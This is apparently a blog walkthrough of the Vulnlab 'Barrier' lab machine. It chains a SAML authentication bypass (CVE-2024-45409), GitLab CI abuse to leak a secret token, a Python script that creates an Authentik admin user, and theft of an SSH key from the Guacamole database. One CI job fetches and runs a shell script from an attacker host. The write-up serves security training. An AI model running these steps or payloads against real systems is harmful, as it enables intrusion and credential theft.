---
categories:
- Vulnlab
image:
  path: preview.png
layout: post
media_subpath: /assets/posts/2025-01-04-vl-barrier
tags:
- linux
- sso
- oauth
- gitlab
- ci/cd
title: VL Barrier
---

Barrier is a medium-difficulty machine on Vulnlab that plays around the concept of Single-Sign-On (SSO).

## Foothold

As always, we scan for open ports:

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
9000/tcp open  cslistener
9443/tcp open  tungsten-https
```

Trying to visit 80/443 in a browser redirects us to gitlab.barrier.vl, which we add to our hosts file in order to resolve it. This allows us to explore Gitlab, where we find a public repository "gitconnect", owned by the user "satoru". The script connects to Gitlab to list the repos there and is using hardcoded credentials to do so:

```python
import requests
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_gitlab_repos():
    base_url = 'https://gitlab.barrier.vl'
    api_url = urljoin(base_url, '/api/v4/')

    auth_data = {
        'grant_type': 'password',
        'username': 'satoru',
        'password': '***'
    }

    try:
        session = requests.Session()
        session.verify = False

        response = session.post(urljoin(base_url, '/oauth/token'), data=auth_data)
        response.raise_for_status()

        token = response.json()['access_token']
        headers = {'Authorization': f'Bearer {token}'}

        projects_response = session.get(urljoin(api_url, 'projects'), headers=headers)
        projects_response.raise_for_status()

        projects = projects_response.json()

        print("Available repositories:")
        for project in projects:
            print(f"\nName: {project['name']}")
            print(f"Description: {project.get('description', 'No description available')}")
            print(f"URL: {project['web_url']}")
            print(f"Last activity: {project['last_activity_at']}")
            print("-" * 50)

    except requests.exceptions.RequestException as e:
        print(f"Error occurred: {str(e)}")
        if hasattr(e.response, 'text'):
            print(f"Response text: {e.response.text}")
    finally:
        session.close()

if __name__ == "__main__":
    get_gitlab_repos()% 
```


While the author removed the password for security reasons, we can still find it in the commit history. We are now able to authenticate to Gitlab using this username, password combination as satoru.

We explore the Gitlab instance and create a new repository for testing purposes. In the members panel, we can try to add users and use the autocompletion functionality to find which other users exist - in this case only one called "akadmin", which seems to be the root user of this Gitlab instance. We check for any CI/CD runners but can't identify any.

Further enumeration shows, that `http://barrier.vl:8080` has a default tomcat page. We go for low hanging fruits like checking the `/manager` endpoint, which does indeed exist but we can't login. As a next step, we do a bit of directory bruteforcing to check if there is any guessable app on this tomcat server (note that this takes like 10 minutes - it's not strictly required though):

```
ffuf -u http://barrier.vl:8080/FUZZ -w ~/tools/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -ac
...
manager
guacamole
```

We found an Apache Guacamole endpoint. If we could login here, we might get access to another machine via VNC, RDP or SSH. Unfortunately the credentials we have don't work though and we fail to guess another login. We also try the credentials on SSH "just in case" but that fails as well. 

We also saw ports 9000/9443 and explore these as the next step. Both ports run the same web app "Authentik" with it's ssl version on port 9443. We try the credentials on this app as well and manage to login as satoru - the user uses the same password for his SSO login as for his local Gitlab login.

After logging in, we see 2 applications - Gitlab und Guacamole. So at this point, even without fuzzing we know about the Guacamole application:

![authentik.png](authentik.png)

We try to use the Guacamole application but it's not working - this user likely has no access to it. We also have no administrative permissions on Authentik, so we are stuck with the privileges we have. It's however noteworthy that Gitlab also uses SSO - we remember a recent vulnerability that allowed to escalate to other users:

- [https://projectdiscovery.io/blog/ruby-saml-gitlab-auth-bypass](https://projectdiscovery.io/blog/ruby-saml-gitlab-auth-bypass)
- [https://github.com/synacktiv/CVE-2024-45409](https://github.com/synacktiv/CVE-2024-45409)

The blog describes how we can, given that we can intercept a valid SAML authentication process, manipulate it so we become another user instead (remember we found one called "akadmin" earlier). To execute the attack we follow the steps outlined in the repository.

First we log out of gitlab, then intercept everything in burp. We click "Single Sign On" and forward until we get this request:

```
GET /users/auth/saml/callback?SAMLResponse=nVhZk...
Host: gitlab.barrier.vl
...
```

We copy the SAML and decode it like [this](https://gchq.github.io/CyberChef/#recipe=URL%5FDecode%28%29From%5FBase64%28%27A%2DZa%2Dz0%2D9%252B%2F%253D%27%2Ctrue%2Cfalse%29Raw%5FInflate%280%2C0%2C%27Adaptive%27%2Cfalse%2Cfalse).

Then we save the result into "response.xml" and run the script to change the user to "akadmin" as follows:

```
python3 CVE-2024-45409.py -r response.xml -n akadmin -e -o response_patched.xml
[+] Parse response
	Digest algorithm: sha256
	Canonicalization Method: http://www.w3.org/2001/10/xml-exc-c14n#
[+] Remove signature from response
[+] Patch assertion ID
[+] Patch assertion NameID
[+] Patch assertion conditions
[+] Move signature in assertion
[+] Patch response ID
[+] Insert malicious reference
[+] Clone signature reference
[+] Create status detail element
[+] Patch digest value
[+] Write patched file in response2_patched.xml
``` 

Now in the still intercepted request, we exchange the base64 blob with the new one and continue. This logs us into gitlab as "akadmin" instead of "satoru". We check the admin area and find that there is a runner available! This means that if we provide a repo with a specific build file and tag - it will be build automatically by this runner which is likely a docker container. We note that the runner is also paused - we can now resume it since we are the administrator. We also see that the tag required is `auto_5e7f` in the runner options.

We explore the CI/CD settings further and find that there is a variable `AUTHENTIK_TOKEN`. We can either read it from here or print it out from the runner. I'm going to show the runner method since it's a bit more interesting.

First we create a new project "devops" and then create the following file `.gitlab-ci.yml`:

```
image:
    name: redis:alpine
    pull_policy: if-not-present

stages:
  - build

job_build:
  stage: build
  script:
    - echo $AUTHENTIK_TOKEN
  tags:
    - auto_5e7f
```

Note that due to the pull policy and because since this runner does not have internet access, you have to use an existing docker image. As an attacker, you don't really know about any locally installed images, but you can make an educated guess based on the software you saw listening on the outside. Checking the Authentik docker setup, we note that there will be `redis:alpine` and `postgres:16-alpine` installed. Other than that, there would also be `gitlab/gitlab-runner`. After a moment, we can find the output of the build job under [https://gitlab.barrier.vl/akadmin/devops/-/jobs](https://gitlab.barrier.vl/akadmin/devops/-/jobs). This shows the value of the token as well.

You can also get RCE here by downloading & running a shell script (although it's not required):

```
image:
    name: redis:alpine
    pull_policy: if-not-present

stages:
  - build

job_build:
  stage: build
  script:
    - wget 10.8.0.101:8080/x
    - sh x
  tags:
    - auto_5e7f

```

So what is this Authentik token? We assume it is used for authentication against the Authentik API - maybe to automate some SSO things. We check the docs on how to use it: [https://docs.goauthentik.io/docs/developer-docs/api/](https://docs.goauthentik.io/docs/developer-docs/api/) .

Eventually, I decided to write a python script that uses the api to create a new administrative user:

```python
import requests
from urllib.parse import urljoin
import sys

proxies = {'http': 'http://127.0.0.1:8081'}

class AuthentikAPI:
    def __init__(self, base_url, api_token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {api_token}',
            'Accept': 'application/json',
        })
        self.session.proxies.update(proxies)

    def test_connection(self):
        try:
            response = self.session.get(urljoin(self.base_url, '/api/v3/core/users/me/'))
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"Error connecting to Authentik: {e}")
            return None

    def create_user(self, username):
        try:
            data = {
                "username": username,
                "name": username
            }
            response = self.session.post(
                urljoin(self.base_url, '/api/v3/core/users/'),
                json=data
            )
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"Error creating user: {e}")
            return None

    def set_password(self, pk, password):
        try:
            data = {
                "password": password
            }
            response = self.session.post(
                urljoin(self.base_url, f'/api/v3/core/users/{pk}/set_password/'),
                json=data
            )
            response.raise_for_status()
            return True
        except requests.exceptions.RequestException as e:
            print(f"Error creating user: {e}")
            return False

    def add_user_to_admin_group(self, user_pk):
        try:
            response = self.session.get(urljoin(self.base_url, '/api/v3/core/groups/'))
            response.raise_for_status()
            groups = response.json()
            admin_group = next(g for g in groups['results'] if g['name'] == 'authentik Admins')

            data = {
                "pk": user_pk
            }

            response = self.session.post(
                urljoin(self.base_url, f'/api/v3/core/groups/{admin_group["pk"]}/add_user/'),
                json=data
            )
            response.raise_for_status()
            return True
        except requests.exceptions.RequestException as e:
            print(f"Error adding user to admin group: {e}")
            return False

def main():
    base_url = "http://barrier.vl:9000"
    api_token = "***"
    username = "superadmin"
    password = "Barrier123!"

    client = AuthentikAPI(base_url, api_token)

    if not client.test_connection():
        print("Failed to connect to Authentik")
        sys.exit(1)

    new_user = client.create_user(username)
    if not new_user:
        print("Failed to create user")
        sys.exit(1)

    if client.set_password(new_user['pk'], password):
        print(f"Successfully set password")
    else:
        print("Failed to set password")
        sys.exit(1)

    if client.add_user_to_admin_group(new_user['pk']):
        print(f"Successfully created admin user: {new_user['username']}")
    else:
        print("Failed to add user to admin group")
        sys.exit(1)

if __name__ == "__main__":
    main()%       
```

Now we can log into `https://barrier.vl:9443` as the new administrator user. This allows us to see all users, which is important since we are still looking for one that might be able to access Guacamole.

We find that there is also a user called `maki`. On `https://barrier.vl:9443/if/admin/#/identity/users` we choose to impersonate the user and then access `http://barrier.vl:8080/guacamole`.

This logs us in as maki and we can see, that there is one connection stored called "Maintenance":

![Maintenance Session](guacamole.png)

This gives us our first shell and the user flag.

## Privilege Escalation

Having a shell allows us to read the guacamole configuration file:


```
maki@barrier:~$ cat /etc/guacamole/guacamole.properties 
# MySQL properties
mysql-hostname: 127.0.0.1
mysql-port: 3306
mysql-database: guac_db
mysql-username: guac_user
mysql-password: ***

saml-idp-metadata-url: file:///opt/saml.xml
saml-idp-url: http://barrier.vl:9000/application/saml/guac/sso/binding/redirect/
saml-callback-url: http://barrier.vl:8080/guacamole/
saml-entity-id: http://barrier.vl:8080
saml-strict: false

saml-group-attribute: groups
saml-username-attribute: http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn

saml-compress-requests: true
saml-compress-responses: true

logback-level: INFO

guacd-hostname: localhost
guacd-port: 4822
guacd-ssl: false

saml-debug: true

extension-priority: saml
#extension-priority: *, saml
```

Besides the SAML options, we also see the database user and password. Let's connect and see if any other connections exist:

```
mysql -u guac_user -p
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 34
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| guac_db            |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use guac_db
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [guac_db]> show tables;
+---------------------------------------+
| Tables_in_guac_db                     |
+---------------------------------------+
| guacamole_connection                  |
| guacamole_connection_attribute        |
| guacamole_connection_group            |
| guacamole_connection_group_attribute  |
| guacamole_connection_group_permission |
| guacamole_connection_history          |
| guacamole_connection_parameter        |
| guacamole_connection_permission       |
| guacamole_entity                      |
| guacamole_sharing_profile             |
| guacamole_sharing_profile_attribute   |
| guacamole_sharing_profile_parameter   |
| guacamole_sharing_profile_permission  |
| guacamole_system_permission           |
| guacamole_user                        |
| guacamole_user_attribute              |
| guacamole_user_group                  |
| guacamole_user_group_attribute        |
| guacamole_user_group_member           |
| guacamole_user_group_permission       |
| guacamole_user_history                |
| guacamole_user_password_history       |
| guacamole_user_permission             |
+---------------------------------------+
23 rows in set (0.001 sec)

MariaDB [guac_db]> select * from guacamole_connection_parameter;
...
```

This last query will show a stored SSH private key that Guacamole uses to connect to a machine. It also shows the passphrase for the private key since guacamole needs to know it as well. (Un-)Fortunately nothing is encrypted here. We copy the SSH key and connect as maki_adm:

```
ssh -i maki_adm.key maki_adm@barrier.vl -oHostKeyAlgorithms=+ssh-rsa
Enter passphrase for key 'maki_adm.key':
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-127-generic x86_64)

...

Last login: Mon Dec 23 17:46:06 2024 from 127.0.0.1
maki_adm@barrier:~$
```

We find that the `.bash_history` of this user contains the password of `maki_admin` from an earlier type - this allows to run `sudo -i` and become root!